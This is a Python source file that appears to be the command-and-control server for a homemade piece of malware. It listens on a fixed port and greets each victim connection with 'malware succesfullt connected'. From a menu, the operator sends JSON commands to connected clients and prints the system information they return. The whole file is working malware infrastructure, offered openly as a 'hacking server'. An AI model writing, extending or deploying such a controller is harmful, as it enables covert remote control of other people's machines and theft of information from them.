from multiprocessing import connection
from dataclasses import *

import socket
import json
import threading
import time
import random
from _thread import *
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def styled_print(message :str, color : bcolors) -> None:
    """print message with color

    Args:
        message (str): message to print
        color (str): color to print
    Returns:
        NONE
    """
    print(color+message+bcolors.ENDC)

def create_server(ip :str, port :str) ->socket :
    """Create socket server

    Args:
        ip (str): given ip
        port (str): host port

    Returns:
        socket: socket object to comminucate
    """

    socket_obj=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_obj.bind((ip,port))
    socket_obj.listen()
    return socket_obj
# send data to client

# receive data from client
def recieve_data(connection: connection) -> json:
    """function to recieve data from client

    Args:
        connection (connection): Connection beetwen client and server

    Returns:
        json: readed data
    """
    return connection.recv(100000).decode()


#accept client connection
def accept_client(s :socket) -> connection:
    """accept client connection

    Args:
        s (Socket): Socket object to accept client connection

    Returns:
        Coonection,address: Socket connection between client and server, client ip and port
    """
    connection, address = s.accept()
   
    return connection,address
#read json
def json_parser(data : json) -> dict:
    """parse json data
    Args:
        data (json): json data to parse
    Returns:
        dict: parsed data

    """
    return json.loads(data)
def send_command(connection : connection, command :str) -> None:
    """send command to client

    Args:
        connection (connection): Socket connection between client and server
        command (str): command to send

    Returns:
        None
    """
    connection.send(command.encode())
def json_convert (data: dict) -> json:
    """convert data to json
    
    Args:
        data (dict): data to convert
    
    Returns:
        json: converted data

    """
    return json.dumps(data)

def print_data(data : dict) -> None:
    """print data

    Args:
        data (dict): data to print

    Returns:
        None
    """
    for key in data:
        value=data[key]
        for key2 in value:
            styled_print(str(value[key2]),bcolors.OKBLUE)
def input_data() -> dict:
    """input data

    Returns:
        dict: input data
    """
    data={}
    styled_print("What you want to do :) ? ",bcolors.OKGREEN)
    styled_print("1) get info",bcolors.OKGREEN)
    styled_print("2) exit",bcolors.OKGREEN)
    user_input=input("Enter command: ")
    if user_input=="1":
        data["command"]="sysinfo"
    elif user_input=="2":
        data["command"]="exit"
    return data
def accpet_client_data(connection : connection) -> None:
    """accept client data and send command to client
    Args:
        connection (connection): Socket connection between client and server
    
    Returns:
        None
    """
    while True:
        try:
            styled_print("malware succesfullt connected :))))))", bcolors.OKGREEN)
            input=input_data()
            input=json_convert(input)
            send_command(connection,input)
            data = recieve_data(connection)
            data = json_parser(data)
            print_data(data)
        except:           
            connection.close()
            break    

def print_Title():
    """Print title of app
    """
    styled_print("="*50+" Welcome to hacikng server "+"="*50,bcolors.OKGREEN)
    styled_print("="*130,bcolors.FAIL)
    styled_print("="*50+" Author : Mohammad choupan "+"="*50,bcolors.OKGREEN)
    styled_print("="*130,bcolors.FAIL)
    styled_print("="*50+" Waiting for connect client "+"="*50,bcolors.OKGREEN)
    styled_print("="*130,bcolors.FAIL)





if __name__== '__main__':
    print_Title()

    server=create_server('0.0.0.0',45673)
    
    while True:
        connection,address=accept_client(server)        
        start_new_thread(accpet_client_data, (connection,))
        
        
